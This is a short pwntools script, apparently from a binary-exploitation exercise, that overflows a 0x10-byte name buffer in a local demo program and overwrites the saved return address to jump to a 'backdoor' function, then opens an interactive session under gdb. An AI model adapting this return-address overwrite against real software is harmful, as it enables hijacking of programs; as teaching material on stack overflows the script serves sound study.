from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./demo_BOF1')

backdoor_addr = 0x401196
no_push_rbp_backdoor_addr = 0x40119b

gdb.attach(r)
# r.sendafter("What's your name: ", b'a' * 0x10 + b'a' * 0x8 + p64(backdoor_addr))
# 0x10 is the size of name[0x10], 0x8 is the extra size for covering old rdp value
r.sendafter("What's your name: ", b'a' * 0x18 + p64(no_push_rbp_backdoor_addr))

r.interactive()
